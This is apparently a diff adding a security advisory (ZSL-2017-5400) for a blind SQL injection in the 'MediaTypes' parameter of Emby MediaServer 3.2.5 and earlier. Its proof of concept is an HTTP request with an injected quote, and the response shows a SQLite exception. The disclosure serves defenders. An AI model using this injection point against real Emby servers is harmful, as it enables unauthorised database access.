@@ -1,0 +1,66 @@
+Emby MediaServer 3.2.5 Boolean-based Blind SQL Injection Vulnerability
+
+
+Vendor: Emby LLC
+Product web page: https://www.emby.media
+Affected version: 3.2.5
+                  3.1.5
+                  3.1.2
+                  3.1.1
+                  3.1.0
+                  3.0.0
+
+Summary: Emby (formerly Media Browser) is a media server designed to organize,
+play, and stream audio and video to a variety of devices. Emby is open-source,
+and uses a client-server model. Two comparable media servers are Plex and Windows
+Media Center.
+
+Desc: Emby suffers from a blind SQL injection vulnerability. Input passed via the GET
+parameter 'MediaTypes' is not properly sanitised before being returned to the user
+or used in SQL queries. This can be exploited to manipulate SQL queries by injecting
+arbitrary SQL code.
+
+Tested on: Microsoft Windows 7 Professional SP1 (EN)
+           Mono-HTTPAPI/1.1, UPnP/1.0 DLNADOC/1.50
+           Ubuntu Linux 14.04.5
+           MacOS Sierra 10.12.3
+           SQLite3
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5400
+Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2017-5400.php
+
+SSD Advisory: https://blogs.securiteam.com/index.php/archives/3098
+
+
+22.12.2016
+
+--
+
+
+PoC:
+
+GET /emby/Users/abb355429db54e159ac2a7a3cbd6eb12/Items?ParentId=4cd160cad6c50f34ca42be0136af2316&Filters=IsNotFolder&Recursive=true&SortBy=SortName&MediaTypes=Audio%2cVideo'&Limit=100&Fields=MediaSources%2CChapters&ExcludeLocationTypes=Virtual HTTP/1.1
+Host: 10.211.55.3:8096
+accept: application/json
+x-mediabrowser-token: ba5a68dfa1134bd6af642228bbf757bb
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+x-emby-authorization: MediaBrowser Client="Emby Mobile", Device="Chrome 55.0.2883.87", DeviceId="104a154d5aa8c9576a2508113b47a53b6170253c", Version="3.1.0.0", UserId="abb355429db54e159ac2a7a3cbd6eb12"
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8
+Connection: close
+
+Response:
+
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html
+Server: Mono-HTTPAPI/1.0
+Date: Tue, 21 Feb 2017 12:06:09 GMT
+Content-Length: 64
+Connection: close
+
+Exception of type 'SQLitePCL.pretty.SQLiteException' was thrown.
